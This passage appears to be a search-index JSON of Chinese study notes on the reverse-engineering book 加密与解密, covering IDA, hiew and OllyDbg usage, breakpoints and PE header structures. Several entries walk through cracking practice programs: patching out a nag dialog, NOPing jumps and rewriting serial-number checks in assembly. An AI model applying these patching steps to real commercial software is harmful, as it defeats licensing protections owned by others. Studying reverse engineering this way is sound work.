            "text": "图形化模式    加载符号文件    load file/pdb file  自动从微软官网寻找最合适当前版本的pdb或dbg    api帮助关联    将idagui.cfg中的 helpfile 指向本地windows api帮助文件    ctrl + F1 实现查询    文件输出    file/produce file    map文件  各函数等符号信息    asm文件  仅输出汇编文件部分    dump database to IDC file  低版本向高版本恢复当前使用数据    dump typeinfo to IDC file  将用户自定义的数据类型保存到IDC文件", 
            "title": "3.2.18 其他功能"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#33", 
            "text": "", 
            "title": "3.3 可执行文件的修改"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#hiew", 
            "text": "快捷键      按键  功能      F5  跳转到地址（支持相对地址和虚拟地址（前面加上 . ））    F1  帮助    F3  进入编辑状态    F2  修改汇编代码    F9  保存", 
            "title": "hiew"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#34", 
            "text": "", 
            "title": "3.4 静态分析技术应用实例"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#341", 
            "text": "", 
            "title": "3.4.1 解密初步"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#342", 
            "text": "", 
            "title": "3.4.2 逆向工程初步"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#1-mission-failed", 
            "text": "IDA查看string窗口  双击字符“...mission failed...”,到代码处  双击交叉引用，记下地址  在OD中跳转到此地址，可nop掉，也可jump掉过，此处跳过，在 push 0 处，修改为 jmp 0040124E", 
            "title": "1. 移除\"mission failed\"对话框"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#2", 
            "text": "在IDA name窗口中，双击GetWindowTextA的调用处  发现有两次调用，第一处比较可疑，进入  OD将 jmp eax nop掉，就可以执行下面的程序，GetWindowTextA将文本空间内容放到缓冲区，MessageBoxA从缓存区中读取文本并显示到消息框中", 
            "title": "2. 将输入字符显示到对话框"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#3", 
            "text": "​   修改指定的字符串    查找指定字符串的两种方式    IDA-  shift+F12    OD -  鼠标右键-Search for- All referenced text strings      OD - 鼠标右键-中文搜索-智能搜索  -  CTRL+F  ida给出的结果会更符合要求，OD给出了太多的结果      **new: 智能搜索更好用**    在ida中找到字符串之后，在od跳转到该地址    在该处右键-  follow dump-  selection，会在内存窗口中看到该字符串    ctrl+e 修改，可以在notepad中写好，然后使用 shift+insert 粘贴    选中修改部分，右键- copy to executalbe file    在弹出的窗口中，选择修改后的部分，右键- save file", 
            "title": "3. 修改字符"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#4", 
            "text": "找到合适的地址    在od中修改，代码如下    ？不知道有没有一次性复制粘贴的办法  x86asm\n   cmp ecx,5\n   jnz 4012CD\n   mov edx,403000\n   mov bl,[eax]\n   mov bh,[edx]\n   cmp bl,bh\n   jnz 4012CD\n   inc eax\n   inc edx\n   dec ecx\n   jz 4012B8\n   jmp 40127A   保存", 
            "title": "4. 完成序列号验证"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#35", 
            "text": "", 
            "title": "3.5 补充"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第三章-静态调试技术/#351", 
            "text": "功能键  功能      R  将16机制码以字符串形式解读    F5  显示反汇编的源码    shift+F12  显示strings窗口    alt+T  文本搜索    ctrl+T  继续下一个查找    alt+B  二进制搜索    B  2/16进制转换    A  解释光标处的地址为一个字符串的首地址    H  16/10进制转换    ；  注释    X  转换视图为交叉参考模式    shift+E  提取数据    shift+F1  导出数据      F5：查看源代码的过程中，及时将变量名( N键 )改为有意义的名称  函数窗口：红色的无法反汇编成源码，白色的可以", 
            "title": "3.5.1 快捷键"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/", 
            "text": "加密与解密 第2篇 调试篇\n\n\n第二章 动态分析技术\n\n\n2.1 ollyDbg\n\n\n2.1.1 ollyDbg界面\n\n\n\n\n窗口\n\n\n\n\nCPU等各窗口\n\n\n\n\n\n\nCPU面板窗口\n\n\n\n\n\n\n反汇编\n\n\n\n\n\n\naddress列\n\n\n\n\n\n\nhex dump列 \n\n\n\n\n\n\n快捷键：F2设置断点\n\n\n\n\n\n\nDisassemly列\n\n\n\n\n\n\ncomment\n\n\n\n\n\n\n快捷键：；\n\n\n\n\n\n\n多行选择\n\n\n\n\n\n\nshift+键盘上下\n\n\n\n\nctrl+鼠标\n\n\n\n\n\n\n\n\n信息\n\n\n\n\n与指令相关的寄存器值\n\n\napi调用提示\n\n\n跳转提示\n\n\n等\n\n\n\n\n\n\n\n\n数据\n\n\n\n\n十六进制显示文件在内存中的数据\n\n\n\n\n\n\n\n\n寄存器\n\n\n\n\n\n\n堆栈\n\n\n\n\n\n\n2.1.2 OllyDbg的设置\n\n\n界面设置\n\n\n\n\nudd文件和插件路径设置\n\n\n\n\n\n\noptions -\n appearance-\n Directores\n\n\n\n\n设置成绝对路径\n\n\n\n\nudd文件\n\n\n\n\n保存当前调试的一些状态\n\n\n\n\n断点\n\n\n\n\n注释等\n\n\n\n\n\n\n插件\n\n\n\n\n\n\n调试设置\n\n\n\n\nOptions -\n Debugging options\n\n\n\n\n忽略各种异常\n\n\n加载符号文件\n\n\n\n\n让ollydbg以函数名显示DLL中的函数\n\n\n\n\n\n\nDebug-\nselect import libraries\n\n\n\n\n关联到右键\n\n\n\n\nOptions/add to explorer-\nAdd ollydbg to menu...\n\n\n\n\n2.1.3 加载程序\n\n\ncreateProces创建进程\n\n\n附加到一个运行的进程上\n\n\n\n\nFile/Attach\n\n\n\n\n\n\n隐藏进程的附加\n\n\n\n\nshell\n  ollydbg.exe -p pid值\n\n\n\n\n\n\n附加不成功\n\n\n\n\n\n\na.exe 调用b.exe\n\n\n\n\nb.exe附加不成功\n\n\n设置olldbg为\nJust-in-time debugging\n\n\n修改b.exe的入口点指令为CC(int 3)\n\n\n运行a.exe\n\n\nb.exe运行到int 3异常\n\n\n还原原指令，继续调试\n\n\n\n\n2.1.4 基本操作\n\n\n\n\n\n\n准备工作\n\n\n\n\n\n\n加载目标文件调试\n\n\n\n\n\n\n\n\nOptions/Debugging Options -\n Event\n\n\n\n\n断点设置：\n\n\n\n\nsystem breakpoints:  int3\n\n\nEntry point of main module：主模块的入口点\n\n\n\n\nwinMain: 即使设置了这个选项，一般也会断在文件入口点\n\n\n\n\n\n\n断点跟踪\n\n\n\n\n\n\n\n\n\n\n\n\n功能键\n\n\n功能\n\n\n\n\n\n\n\n\n\n\nF7\n\n\n单步步进\n\n\n\n\n\n\nF8\n\n\n单步步过\n\n\n\n\n\n\nCtrl+F9\n\n\n直到出现Ret指令时中断\n\n\n\n\n\n\nalt+F9\n\n\n若进入系统领空，瞬间返回应用程序领空\n\n\n\n\n\n\nF9\n\n\n运行程序\n\n\n\n\n\n\nctlr+F2\n\n\n重新调试应用程序\n\n\n\n\n\n\nF12\n\n\n暂停程序，程序进入死循环时可以使用\n\n\n\n\n\n\nF2\n\n\n设置/取消断点\n\n\n\n\n\n\nalt+B\n\n\n打开断点窗口（不显示硬件断点）\n\n\n\n\n\n\nctrl+N\n\n\n打开应用程序输入表\n\n\n\n\n\n\nF3\n\n\n打开文件\n\n\n\n\n\n\nF5\n\n\n显示各个窗口，双击返回当前窗口\n\n\n\n\n\n\nALT+M\n\n\n显示内存\n\n\n\n\n\n\nF4\n\n\n执行到光标所在行\n\n\n\n\n\n\nshift+F2\n\n\n条件断点\n\n\n\n\n\n\nshift+F4\n\n\n条件记录断点\n\n\n\n\n\n\nAlt+F7\n\n\n转到上一个找到的参考\n\n\n\n\n\n\nAlt+F8\n\n\n转到下一个找到参考\n\n\n\n\n\n\nCtrl+R\n\n\n搜索所选命令的参考。该命令扫描激活模块的全部可执行代码，以找到涉及到首个选中的命令的全部相关参考（包括：常量、跳转及调用），您可以在参考中使用快捷键 Alt+F7 和 Alt+F8来浏览这些参考。为便于您使用，被参考的命令也包含在该列表中。\n\n\n\n\n\n\n\n\n\n\n\n\n需要多次按F7或者F8键时，可以按\nctrl+F7\n或者\nctlr+F8\n，直到ESC、F12或者遇到其他断点中止\n\n\n\n\n\n\n设置断点\n\n\n\n\n\n\n在特定表达式上设置断点\n\n\n\n\nCtrl+G :  打开跟随表达式窗口（e.g \nGetDlgItemTextA\n）\n\n\nF2 设置断点\n\n\nwin9x系统中，ollydbg无法对api函数设断点\n\n\n在输入表中设置断点\n\n\nCtrl+N 打开输入表\n\n\n找到要找的函数\n\n\nenter或者右键\"Find references to import\"命令打开调用此函数的参考代码窗口，找到相应的代码\n\n\nenter切换到相应的代码\n\n\nF2设置断点\n\n\n\n\n\n\n\n\n调试分析\n\n\n\n\n\n\n程序中断后，\nalt+f9\n回到调用函数的地方\n\n\n\n\nalt+b\n，禁用掉\ngetDlgItemTextA\n断点\n\n\n为了方便反复调试，在调用出设置断点\n\n\n\n\n代码阅读\n\n\n\n\n\n\nAPI定义\n\n\n\n\n\n\n调用约定\n\n\n\n\n__stdcall\n\n\n参数从右向左顺序入栈\n\n\n由被调用者清理堆栈中的参数\n\n\n返回值保存在eax中\n\n\n\n\n\n\nC调用\n\n\n参数从右向左顺序入栈\n\n\n由调用者清理堆栈参数\n\n\n\n\n\n\n\n\n\n\n\n\n查看指定地址处内存值的变化\n\n\ne.g \npush eax\n\n\n\n\n在当前代码行暂停\n\n\n在\neax\n寄存器窗口上右键，执行\"Follow Dump\"，查看数据窗口\n\n\n单步执行\ncall GetDlgItemTextA\n完成\n\n\n已经看到内存中值的变化\n\n\n\n\n\n\n\n\n保存修改后的文件\n\n\n\n\n\n\ne.g : \nje short 0040122E\n \n\n\n\n\n修改\nZF\n标志位，单击取反\n\n\n修改改行代码为\n9090\n\n\n鼠标右键，\ncopy to executable/Selection\n\n\n\n\nsave File\n\n\n\n\n\n\n算法分析\n\n\n\n\n\n\n2.1.5 断点\n\n\n\n\n\n\nint 3断点\n\n\n\n\n\n\n原理：其机器码是CCh，也常称为CC指令，当被调试进程执行INT3指令导致一个异常时，调试器会捕捉这个异常从而停在断点处，然后将该断点处的指令恢复成原来指令\n\n\n\n\n\n\nØ  优点：可以设置无数个断点\n\n\nØ  缺点：改变了原程序指令，容易被软件检测到    \n\n\nØ  设置方法：F2设置（就是普通的断点） F2取消\n\n\n\n\n\n\n硬件断点\n\n\n\n\n\n\n原理：硬件断点和DRx调试寄存器有关，DRx有8个寄存器\n\n\n\n\nDR0～3：调试地址寄存器，保存需要监视的地址，如设置硬件断点\n\n\nDR4～5：保留\n\n\nDR6：调试寄存器组状态寄存器\n\n\nDR7：调试寄存器组控制寄存器\n\n\n\n\n\n\n\n\n硬件断点是使用DR0 DR1 DR2 DR3来设置断点\n\n\nØ  优点：断点速度快，不容易被发现\n\n\nØ  缺点：只能设置4个断点DR0 DR1 DR2 DR3\n\n\nØ  设置方法：F8到需要设置的位置，右键“Breakpoint/Hardware,on execution”  \n\n\n\n\n内存断点\n\n\n\n\nØ  原理：OD可以设置内存访问断点或内存写入断点，原理是对所设的地址设为不可访问/不可写属性，同样当访问/写入的时候会报异常，并且停留在异常处\n\n\nØ  优点：内存断点不修改原代码。它不像INT3断点，因为修改程序代码而导致中断，因此在遇到代码校验，并且硬件断点失灵情况下，可以用内存断点来代替\n\n\nØ  缺点：只能设置1次\n\n\nØ  设置方法：\n\n\n​        右键-\nBreakpoint-\nMemory ,on access(断点/内存写入)\n\n\n​                   -\nMemory ,on write(断点/内存访问)\n\n\n\n\n内存访问一次性断点\n\n\n\n\nØ  原理：原理和”Set memory breakpoint on access”功能一样\n\n\nØ  优点：对整个内存块设置断点，快捷键也是F2\n\n\nØ  特点：一次性断点，当所在段读取或执行时就中断，中断发生以后，断点将被删除\n\n\nØ  设置方法：ALT+M 右键-\n”Set break-on-access”\n\n\n\n\n\n\n消息断点\n\n\n\n\n\n\n原理：Windows本身是由消息驱动的，如果调试时没有合适的断点，额可以尝试消息断点\n\n\n\n\n\n\n如何中断返回\n\n\n\n\n在中断后，由于处在系统代码底层，所以\nalt+F9\n或者\nctrl+F9\n，无法回到程序的代码领空\n\n\n所以，需要在.txt段中设置内存访问断点\nset break-on-access\n\n\nF9运行\n\n\n由于中断的地方可能不是想要的消息，所以，可能需要重复1-3步数次，最后发现\ncheck\n按钮事件代码\n\n\nalt+b进入断点窗口，删除消息断点\n\n\n\n\n\n\n\n\n条件断点\n\n\n\n\n\n\n条件记录断点\n\n\n\n\n\n\n2.1.6 插件\n\n\n\n\n\n\n常用插件\n\n\n\n\n\n\ncommand bar\n\n\nalt +F1\n 快速显示/隐藏command bar\n\n\ncltr+D\n 快速定位到输入框\n\n\n\n\n\n\n插件开发\n\n\n\n\n\n\n2.1.7 run trace\n\n\n2.1.8 hit trace\n\n\n2.1.9 符号调试技术\n\n\n\n\n\n\n符号格式\n\n\n\n\n\n\n将16进制数转换为源文件代码行、函数名以及变量名称\n\n\n\n\n\n\n创建调试文件\n\n\n\n\n\n\n以vc6.0为例，建立带有pdb调试信息的调试版本：\n\n\n\n\nbulild -\n set active configuration -\n win32 debug\n\n\nproject -\n settings -\n c/c++ -\n category -\n general -\n debug info -\n program database 产生pdb文件\n\n\n\n\nlink -\n category -\n debug -\n debug info \n microsoft format \n separate types  \n generate mapfiles 产生map文件\n\n\n\n\n\n\n用符号文件调试\n\n\n\n\n\n\ndebugging options -\n cpu -\n synchronize soure with cpu 选中\n\n\n\n\ncpu窗口-\n 单击comment栏 -\n 切换到source\n\n\ndebugging options -\n debug -\n hide none-existing source files 取消选中\n\n\nview/source files 选中正确的源文件\n\n\nview/source 打开源代码窗口，就可以看到源码\n\n\n在源码窗口下断点，F9运行，就可以正常在源码和反汇编窗口同步调试应用程序了\n\n\n\n\n2.1.10 OllyDbg常见问题\n\n\n\n\n\n\n乱码的问题\n\n\n\n\n\n\n如何快速回到当前领空\n\n\n\n\n\n\n双击寄存器窗口的EIP\n\n\n\n\nOllydbg如何修改EIP\n\n\n\n\nCtlr+*\n \n发现笔记本键盘无效\n:cry:\n\n\n\n\n什么是UDD\n\n\n\n\n所有程序或模组相关的信息\n\n\n\n\n删除了断点，重新加载时，会重新出现\n\n\n\n\nollydbg.ini -\n 修改为 bacup UDD files=1\n\n\n\n\npush E000\n未知字符\n\n\n\n\n0E000 -\n 0E000\n\n\n\n\n假死\n\n\n\n\nollydbg.ini -\n restore windows=0\n\n\n\n\n微调窗口显示\n\n\n\n\nctrl+↑ 或者 ctrl+↓ 上下翻动一个字节\n\n\n\n\n“复制到可执行文件”-\n 报错：“Unable to locate data in executable file”\n\n\n\n\n修改的地方不在raw size范围内，修改pe文件，是rawSize=VirtualSize\n\n\n\n\n\n\n能否把call调用修改为函数名称形式\n\n\nshift+;\n-\n 输入函数名称\n\n\n\n\n\n\n2.2 softice调试器", 
            "title": "加密与解密 第二章 动态调试技术"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#_1", 
            "text": "", 
            "title": "第二章 动态分析技术"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#21-ollydbg", 
            "text": "", 
            "title": "2.1 ollyDbg"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#211-ollydbg", 
            "text": "窗口   CPU等各窗口    CPU面板窗口    反汇编    address列    hex dump列     快捷键：F2设置断点    Disassemly列    comment    快捷键：；    多行选择    shift+键盘上下   ctrl+鼠标     信息   与指令相关的寄存器值  api调用提示  跳转提示  等     数据   十六进制显示文件在内存中的数据     寄存器    堆栈", 
            "title": "2.1.1 ollyDbg界面"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#212-ollydbg", 
            "text": "", 
            "title": "2.1.2 OllyDbg的设置"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#_2", 
            "text": "udd文件和插件路径设置    options -  appearance-  Directores   设置成绝对路径   udd文件   保存当前调试的一些状态   断点   注释等    插件", 
            "title": "界面设置"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#_3", 
            "text": "Options -  Debugging options   忽略各种异常", 
            "title": "调试设置"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#_4", 
            "text": "让ollydbg以函数名显示DLL中的函数    Debug- select import libraries", 
            "title": "加载符号文件"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#_5", 
            "text": "Options/add to explorer- Add ollydbg to menu...", 
            "title": "关联到右键"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#213", 
            "text": "", 
            "title": "2.1.3 加载程序"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#createproces", 
            "text": "", 
            "title": "createProces创建进程"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#_6", 
            "text": "File/Attach    隐藏进程的附加   shell\n  ollydbg.exe -p pid值    附加不成功    a.exe 调用b.exe   b.exe附加不成功  设置olldbg为 Just-in-time debugging  修改b.exe的入口点指令为CC(int 3)  运行a.exe  b.exe运行到int 3异常  还原原指令，继续调试", 
            "title": "附加到一个运行的进程上"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#214", 
            "text": "准备工作    加载目标文件调试     Options/Debugging Options -  Event   断点设置：   system breakpoints:  int3  Entry point of main module：主模块的入口点   winMain: 即使设置了这个选项，一般也会断在文件入口点    断点跟踪       功能键  功能      F7  单步步进    F8  单步步过    Ctrl+F9  直到出现Ret指令时中断    alt+F9  若进入系统领空，瞬间返回应用程序领空    F9  运行程序    ctlr+F2  重新调试应用程序    F12  暂停程序，程序进入死循环时可以使用    F2  设置/取消断点    alt+B  打开断点窗口（不显示硬件断点）    ctrl+N  打开应用程序输入表    F3  打开文件    F5  显示各个窗口，双击返回当前窗口    ALT+M  显示内存    F4  执行到光标所在行    shift+F2  条件断点    shift+F4  条件记录断点    Alt+F7  转到上一个找到的参考    Alt+F8  转到下一个找到参考    Ctrl+R  搜索所选命令的参考。该命令扫描激活模块的全部可执行代码，以找到涉及到首个选中的命令的全部相关参考（包括：常量、跳转及调用），您可以在参考中使用快捷键 Alt+F7 和 Alt+F8来浏览这些参考。为便于您使用，被参考的命令也包含在该列表中。       需要多次按F7或者F8键时，可以按 ctrl+F7 或者 ctlr+F8 ，直到ESC、F12或者遇到其他断点中止    设置断点    在特定表达式上设置断点   Ctrl+G :  打开跟随表达式窗口（e.g  GetDlgItemTextA ）  F2 设置断点  win9x系统中，ollydbg无法对api函数设断点  在输入表中设置断点  Ctrl+N 打开输入表  找到要找的函数  enter或者右键\"Find references to import\"命令打开调用此函数的参考代码窗口，找到相应的代码  enter切换到相应的代码  F2设置断点     调试分析    程序中断后， alt+f9 回到调用函数的地方   alt+b ，禁用掉 getDlgItemTextA 断点  为了方便反复调试，在调用出设置断点   代码阅读    API定义    调用约定   __stdcall  参数从右向左顺序入栈  由被调用者清理堆栈中的参数  返回值保存在eax中    C调用  参数从右向左顺序入栈  由调用者清理堆栈参数       查看指定地址处内存值的变化  e.g  push eax   在当前代码行暂停  在 eax 寄存器窗口上右键，执行\"Follow Dump\"，查看数据窗口  单步执行 call GetDlgItemTextA 完成  已经看到内存中值的变化     保存修改后的文件    e.g :  je short 0040122E     修改 ZF 标志位，单击取反  修改改行代码为 9090  鼠标右键， copy to executable/Selection   save File    算法分析", 
            "title": "2.1.4 基本操作"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#215", 
            "text": "int 3断点    原理：其机器码是CCh，也常称为CC指令，当被调试进程执行INT3指令导致一个异常时，调试器会捕捉这个异常从而停在断点处，然后将该断点处的指令恢复成原来指令    Ø  优点：可以设置无数个断点  Ø  缺点：改变了原程序指令，容易被软件检测到      Ø  设置方法：F2设置（就是普通的断点） F2取消    硬件断点    原理：硬件断点和DRx调试寄存器有关，DRx有8个寄存器   DR0～3：调试地址寄存器，保存需要监视的地址，如设置硬件断点  DR4～5：保留  DR6：调试寄存器组状态寄存器  DR7：调试寄存器组控制寄存器     硬件断点是使用DR0 DR1 DR2 DR3来设置断点  Ø  优点：断点速度快，不容易被发现  Ø  缺点：只能设置4个断点DR0 DR1 DR2 DR3  Ø  设置方法：F8到需要设置的位置，右键“Breakpoint/Hardware,on execution”     内存断点   Ø  原理：OD可以设置内存访问断点或内存写入断点，原理是对所设的地址设为不可访问/不可写属性，同样当访问/写入的时候会报异常，并且停留在异常处  Ø  优点：内存断点不修改原代码。它不像INT3断点，因为修改程序代码而导致中断，因此在遇到代码校验，并且硬件断点失灵情况下，可以用内存断点来代替  Ø  缺点：只能设置1次  Ø  设置方法：  ​        右键- Breakpoint- Memory ,on access(断点/内存写入)  ​                   - Memory ,on write(断点/内存访问)   内存访问一次性断点   Ø  原理：原理和”Set memory breakpoint on access”功能一样  Ø  优点：对整个内存块设置断点，快捷键也是F2  Ø  特点：一次性断点，当所在段读取或执行时就中断，中断发生以后，断点将被删除  Ø  设置方法：ALT+M 右键- ”Set break-on-access”    消息断点    原理：Windows本身是由消息驱动的，如果调试时没有合适的断点，额可以尝试消息断点    如何中断返回   在中断后，由于处在系统代码底层，所以 alt+F9 或者 ctrl+F9 ，无法回到程序的代码领空  所以，需要在.txt段中设置内存访问断点 set break-on-access  F9运行  由于中断的地方可能不是想要的消息，所以，可能需要重复1-3步数次，最后发现 check 按钮事件代码  alt+b进入断点窗口，删除消息断点     条件断点    条件记录断点", 
            "title": "2.1.5 断点"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#216", 
            "text": "常用插件    command bar  alt +F1  快速显示/隐藏command bar  cltr+D  快速定位到输入框    插件开发", 
            "title": "2.1.6 插件"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#217-run-trace", 
            "text": "", 
            "title": "2.1.7 run trace"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#218-hit-trace", 
            "text": "", 
            "title": "2.1.8 hit trace"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#219", 
            "text": "符号格式    将16进制数转换为源文件代码行、函数名以及变量名称    创建调试文件    以vc6.0为例，建立带有pdb调试信息的调试版本：   bulild -  set active configuration -  win32 debug  project -  settings -  c/c++ -  category -  general -  debug info -  program database 产生pdb文件   link -  category -  debug -  debug info   microsoft format   separate types    generate mapfiles 产生map文件    用符号文件调试    debugging options -  cpu -  synchronize soure with cpu 选中   cpu窗口-  单击comment栏 -  切换到source  debugging options -  debug -  hide none-existing source files 取消选中  view/source files 选中正确的源文件  view/source 打开源代码窗口，就可以看到源码  在源码窗口下断点，F9运行，就可以正常在源码和反汇编窗口同步调试应用程序了", 
            "title": "2.1.9 符号调试技术"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#2110-ollydbg", 
            "text": "乱码的问题    如何快速回到当前领空    双击寄存器窗口的EIP   Ollydbg如何修改EIP   Ctlr+*   发现笔记本键盘无效 :cry:   什么是UDD   所有程序或模组相关的信息   删除了断点，重新加载时，会重新出现   ollydbg.ini -  修改为 bacup UDD files=1   push E000 未知字符   0E000 -  0E000   假死   ollydbg.ini -  restore windows=0   微调窗口显示   ctrl+↑ 或者 ctrl+↓ 上下翻动一个字节   “复制到可执行文件”-  报错：“Unable to locate data in executable file”   修改的地方不在raw size范围内，修改pe文件，是rawSize=VirtualSize    能否把call调用修改为函数名称形式  shift+; -  输入函数名称", 
            "title": "2.1.10 OllyDbg常见问题"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第二章-动态调试技术/#22-softice", 
            "text": "", 
            "title": "2.2 softice调试器"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第十章-PE文件格式/", 
            "text": "第五篇  系统篇\n\n\n第十章  PE文件格式\n\n\n\n\n\n\n主要文件：\nwinnt.h -\n image format\n\n\n\n\n\n\nPE布局\n\n\n\n\n\n\n\n\n10.1  PE的基本概念\n\n\n\n\n磁盘文件偏移和内存偏移的转换\n\n\n\n\n\n\n10.1.1  基地址\n\n\n\n\n\n\n模块：加载到内存中的PE文件被称为模块\n\n\n\n\n\n\n模块句柄（hModule）：映射文件的起始地址，这个初始内存地址也称作基地址（ImageBase）\n\n\n\n\n\n\n访问DLL文件,得到指针：\n\n\n\n\n\n\nc\n  HMODULE GetModuleHandle(LPCTSTR lpModuleName);\n\n\n10.1.2  相对虚拟地址\n\n\n相对地址（RVA）：内存中，相对于ImageBase的偏移\n\n\n目标地址401000h - 装入地址 400000h = RVA 1000h\n\n\n\n\n\n\n虚拟地址(VA) = 基地址（Image Base） + 相对虚拟地址（RVA）\n\n\n\n\n10.1.3  文件偏移地址\n\n\nFileOffset/RawOffset:PE文件存储在磁盘上时，相对于文件头的偏移，起始值时0\n\n\n10.2  MS-DOS头部\n\n\nDOS头部 = DOS MZ 头 + DOS stub\n\n\ntypedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header\n    WORD   e_magic;                     // Magic number\n    WORD   e_cblp;                      // Bytes on last page of file\n    WORD   e_cp;                        // Pages in file\n    WORD   e_crlc;                      // Relocations\n    WORD   e_cparhdr;                   // Size of header in paragraphs\n    WORD   e_minalloc;                  // Minimum extra paragraphs needed\n    WORD   e_maxalloc;                  // Maximum extra paragraphs needed\n    WORD   e_ss;                        // Initial (relative) SS value\n    WORD   e_sp;                        // Initial SP value\n    WORD   e_csum;                      // Checksum\n    WORD   e_ip;                        // Initial IP value\n    WORD   e_cs;                        // Initial (relative) CS value\n    WORD   e_lfarlc;                    // File address of relocation table\n    WORD   e_ovno;                      // Overlay number\n    WORD   e_res[4];                    // Reserved words\n    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)\n    WORD   e_oeminfo;                   // OEM information; e_oemid specific\n    WORD   e_res2[10];                  // Reserved words\n    LONG   e_lfanew;                    // File address of new exe header\n  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;\n\n\n\n\n\n\ne_magic：MZ\n\n\ne_lfanew: PE头的真正偏移量\n\n\n\n\n10.3  PE文件头\n\n\nPNETHeader = ImageBase + dosHeaser-\ne_lfanew\n\n\ntypedef struct _IMAGE_NT_HEADERS {\n    DWORD Signature;\n    IMAGE_FILE_HEADER FileHeader;\n    IMAGE_OPTIONAL_HEADER32 OptionalHeader;\n} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;\n\n\n\n\n10.3.1  Signature字段\n\n\n作用：用来验证该文件是否时PE文件\n\n\n#define IMAGE_NT_SIGNATURE                  0x00004550  // PE00\n\n\n\n\n10.3.2  IMAGE_FILE_HEADER结构\n\n\ntypedef struct _IMAGE_FILE_HEADER {\n    WORD    Machine;\n    WORD    NumberOfSections;\n    DWORD   TimeDateStamp;\n    DWORD   PointerToSymbolTable;\n    DWORD   NumberOfSymbols;\n    WORD    SizeOfOptionalHeader;\n    WORD    Characteristics;\n} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;\n\n\n\n\n字段：\n\n\n\n\nSizeOfOptionalHeader：OptionalHeader字段的大小  \n重要\n\n\nCharacteristics： \n\n\n普通exe文件：010fh\n\n\nDLL文件：0210h\n\n\n\n\n10.3.3  IMAGE_OPTIONAL_HEADER结构\n\n\ntypedef struct _IMAGE_OPTIONAL_HEADER {\n    //\n    // Standard fields.\n    //\n\n    WORD    Magic;\n    BYTE    MajorLinkerVersion;\n    BYTE    MinorLinkerVersion;\n    DWORD   SizeOfCode;\n    DWORD   SizeOfInitializedData;\n    DWORD   SizeOfUninitializedData;\n    DWORD   AddressOfEntryPoint;\n    DWORD   BaseOfCode;\n    DWORD   BaseOfData;\n\n    //\n    // NT additional fields.\n    //\n\n    DWORD   ImageBase;\n    DWORD   SectionAlignment;\n    DWORD   FileAlignment;\n    WORD    MajorOperatingSystemVersion;\n    WORD    MinorOperatingSystemVersion;\n    WORD    MajorImageVersion;\n    WORD    MinorImageVersion;\n    WORD    MajorSubsystemVersion;\n    WORD    MinorSubsystemVersion;\n    DWORD   Win32VersionValue;\n    DWORD   SizeOfImage;\n    DWORD   SizeOfHeaders;\n    DWORD   CheckSum;\n    WORD    Subsystem;\n    WORD    DllCharacteristics;\n    DWORD   SizeOfStackReserve;\n    DWORD   SizeOfStackCommit;\n    DWORD   SizeOfHeapReserve;\n    DWORD   SizeOfHeapCommit;\n    DWORD   LoaderFlags;\n    DWORD   NumberOfRvaAndSizes;\n    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];\n} IMAGE_OPTIONAL_HEADER32, 